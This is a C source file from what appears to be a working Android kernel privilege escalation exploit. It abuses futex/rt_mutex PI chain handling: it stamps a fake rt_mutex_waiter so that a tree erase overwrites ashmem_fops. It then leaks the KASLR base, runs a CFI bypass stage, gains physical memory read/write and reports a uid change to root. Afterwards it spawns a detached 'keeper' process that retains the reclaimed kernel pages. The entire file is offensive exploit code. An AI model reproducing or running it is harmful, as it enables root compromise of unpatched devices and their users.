#include "common.h"

/*
 * s22/b0q main route — Quest3(exp64) trigger edition.
 *
 * The futex choreography, stack stamp and sched_setattr trigger all run
 * inside a disposable 32-bit child (src/exp64/, launched via api.c).
 * This replaces the in-process pselect route: there is no pselect
 * return-writeback window, so the consumer can never walk a clobbered
 * waiter (the QEMU TCG panic class is gone by construction).
 */

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int fake_fops_request;
atomic_int fake_fops_done;
int memfd_leak;

/* Payload word indices — correspond to the stale rt_mutex_waiter fields,
 * stamped at buffer+0x58 by the exp64 child (see src/exp64/stack.c). */
#define EXP_BUF_NWORDS 16
enum {
  EXP_W_TREE_PC      = 0,   /* tree_entry.__rb_parent_color (parent, RED) */
  EXP_W_TREE_RIGHT   = 1,   /* tree_entry.rb_right */
  EXP_W_TREE_LEFT    = 2,   /* tree_entry.rb_left  = WRITE TARGET */
  EXP_W_PI_TREE_PC      = 3,
  EXP_W_PI_TREE_RIGHT   = 4,
  EXP_W_PI_TREE_LEFT    = 5,
  EXP_W_TASK         = 6,   /* waiter->task */
  EXP_W_LOCK         = 7,   /* waiter->lock */
  EXP_W_PI_PRIO      = 8,
  EXP_W_PI_DEADLINE  = 9,
};

static void build_exp_buffer_fops(uint64_t *buf) {
  memset(buf, 0, EXP_BUF_NWORDS * sizeof(uint64_t));

  /* Write primitive: the chain walk's rt_mutex_dequeue(lock, waiter)
   * (b0q rtmutex.c:663) rb_erases the stamped waiter's tree_entry:
   *   pc=fake_fops (RED, bit0=0 → no rebalance), rb_right=0,
   *   rb_left=target → one-child erase → rb_set_parent(child=target,
   *   parent=fake_fops) writes *target = fake_fops | (*target & 1).
   *   &ashmem_fops is 8-aligned ⇒ *target = fake_fops exactly.
   * Collateral: __rb_change_child stores `target` into fake_fops+0x08
   * (the .llseek slot) — repaired by repair_fake_fops_llseek(). */
  buf[EXP_W_TREE_PC]       = fake_fops;
  buf[EXP_W_TREE_RIGHT]    = 0;
  buf[EXP_W_TREE_LEFT]     = kaslr_image_addr(ASHMEM_MISC_FOPS);

  buf[EXP_W_PI_TREE_PC]    = 0;
  buf[EXP_W_PI_TREE_RIGHT] = 0;
  buf[EXP_W_PI_TREE_LEFT]  = 0;

  buf[EXP_W_TASK]          = fake_task;
  buf[EXP_W_LOCK]          = fake_lock;
  buf[EXP_W_PI_PRIO]       = 0;  /* overwritten with task->prio by the walk */
  buf[EXP_W_PI_DEADLINE]   = 0;

  pr_info("exp64 payload fake_fops=%016llx fake_lock=%016llx write_target=%016llx\n",
          (unsigned long long)fake_fops, (unsigned long long)fake_lock,
          (unsigned long long)kaslr_image_addr(ASHMEM_MISC_FOPS));
}

int doreplacefops(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("exp64 route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return 0;
  }

  uint64_t exp_buffer[EXP_BUF_NWORDS];
  build_exp_buffer_fops(exp_buffer);

  int ret = exp_stack_once(exp_buffer);
  if (ret != 0) {
    pr_warning("fops exp_stack_once failed ret=%d errno=%d\n", ret, errno);
    return 0;
  }
  return 1;
}

void reset_main_route_state(void) {
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&cfi_stage_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

static void *cfi_thread(void *arg __attribute__((unused))) {
  while (!atomic_load(&cfi_stage_done)) {
    atomic_store(&fake_fops_request, 1);
    atomic_store(&fake_fops_done, 0);
    while (!atomic_load(&fake_fops_done)) {
      usleep(1000);
    }
    pr_info("enter CFI stage\n");
    try_cfi_stage();
  }
  return NULL;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t cfi;
  SYSCHK(pthread_create(&cfi, NULL, cfi_thread, NULL));

  while (!atomic_load(&cfi_stage_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pr_info("prepare_pipe_buffer_page\n");
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    if (atomic_exchange(&fake_fops_request, 0)) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_exp64);
      reset_main_route_state();
      pr_info("replace_fake_fops this may cause deadlock\n");
      doreplacefops();
      atomic_store(&fake_fops_done, 1);
    }
    usleep(10000);
  }
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("SLIDE_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }

  pin_to_core(CORE);

  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok && !cve_temp_root_mode()) {
    pid_t keeper = spawn_allocation_keeper();
    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
               keeper);
  }
  return exploit_ok ? 0 : 1;
}
